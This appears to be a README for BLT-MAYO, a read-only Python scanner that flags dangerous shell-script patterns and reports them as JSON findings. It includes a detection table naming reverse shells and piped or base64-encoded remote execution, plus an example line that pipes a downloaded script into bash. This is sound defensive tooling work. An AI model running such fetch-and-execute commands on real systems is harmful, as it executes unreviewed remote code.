# BLT-MAYO — Shell Dangerous-Execution Analyzer (Week 3 PR 1)

BLT-MAYO stands for **Monitor, Analyze, Yield, Observe**. It is a read-only Linux security-auditing workflow that turns filesystem artifacts into structured, explainable security findings.

## Architecture

```text
Path arguments or YAML configuration
                ↓
ScanOrchestrator
                ↓
Safe filesystem traversal
                ↓
Metadata and path sensitivity
                ↓
Artifact classification
                ↓
AnalyzerRegistry
                ↓
ShellScriptAnalyzer
                ↓
Reusable shell execution rules
                ↓
Normalized Finding objects
                ↓
Terminal output and JSON report
```

## Shell detections

| Rule ID | Detection | Base severity | Confidence |
|---|---|---:|---:|
| `SHELL-PIPE-TO-SHELL` | `curl`/`wget` piped into a shell | Critical | High |
| `SHELL-REVERSE-SHELL` | Common reverse-shell command forms | Critical | High |
| `SHELL-ENCODED-EXECUTION` | Base64 decode piped into a shell | High | High |
| `SHELL-EVAL` | Dynamic shell `eval` | High | Medium |
| `SHELL-NESTED-SHELL` | Nested shell execution using `-c` | Medium | Medium |

## Safety model

- Inspected scripts are read as text and are never executed or sourced.
- Files are never modified.
- Symlinks are not followed by default.
- Traversal has configurable exclusions, depth, and file-size limits.
- Invalid byte sequences are replaced safely.
- Missing or unreadable files do not crash the analyzer.
- Evidence is restricted to a concise line-level snippet.
- Nothing is uploaded or submitted automatically.

## Requirements

- Python 3.11 or newer
- Linux, Fedora, Ubuntu, Debian, or WSL recommended

## Installation

### Linux, macOS, or WSL

```bash
python -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e ".[dev]"
```

### Windows PowerShell

```powershell
py -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -e ".[dev]"
```

## Run the scanner

Check the installation:

```bash
blt-mayo doctor
```

Scan the supplied shell fixtures:

```bash
blt-mayo scan tests/fixtures/shell
```

Write a JSON report:

```bash
blt-mayo scan tests/fixtures/shell --output shell-scan-report.json
```

Use the example YAML configuration:

```bash
blt-mayo scan --config blt-mayo.example.yml --output shell-scan-report.json
```

## Example finding

A script containing:

```bash
curl -fsSL https://example.invalid/install.sh | bash
```

produces a normalized finding similar to:

```json
{
  "rule_id": "SHELL-PIPE-TO-SHELL",
  "title": "Remote content piped directly to a shell",
  "category": "dangerous-execution",
  "severity": "critical",
  "confidence": "high",
  "artifact_type": "shell_script",
  "evidence": {
    "summary": "Matched dangerous shell construction near line 3",
    "line_number": 3,
    "snippet": "curl -fsSL https://example.invalid/install.sh | bash"
  },
  "remediation": "Download the file to a controlled location, verify its source and checksum, review the contents, and only then execute it."
}
```

## Configuration

The shell analyzer is enabled with:

```yaml
enabled_analyzers:
  - shell
```

See [`blt-mayo.example.yml`](blt-mayo.example.yml) for all traversal and evidence settings.

## Testing

Run linting and compilation:

```bash
ruff check src tests
python -m compileall -q src tests/test_*.py tests/conftest.py
```

Run all tests:

```bash
pytest
```

Run coverage enforcement:

```bash
pytest --cov=blt_mayo --cov-report=term-missing --cov-fail-under=80
```

Run the focused acceptance workflow:

```bash
scripts/run_shell_acceptance.sh
```

Validated for this package: **35 tests passed**, **85.91% total coverage**, Ruff passed, compilation passed, and the focused shell acceptance scan passed.

The tests cover:

- each shell rule independently;
- safe commands and comment-only lines;
- analyzer artifact support;
- correct rule IDs and source lines;
- concise evidence and remediation;
- missing-file and invalid-UTF-8 handling;
- scanner-to-analyzer dispatch;
- JSON report generation;
- CLI execution.

## Repository layout

```text
src/blt_mayo/
├── analyzers/
│   ├── base.py
│   ├── registry.py
│   └── shell_script.py
├── rules/
│   └── shell_execution.py
├── scanner/
├── models/
├── config/
├── reporting/
└── cli/

tests/
├── fixtures/shell/
├── test_shell_execution_rules.py
├── test_shell_script_analyzer.py
└── test_orchestrator_reporting.py
```

Detailed analyzer documentation is available in [`docs/SHELL_ANALYZER.md`](docs/SHELL_ANALYZER.md).
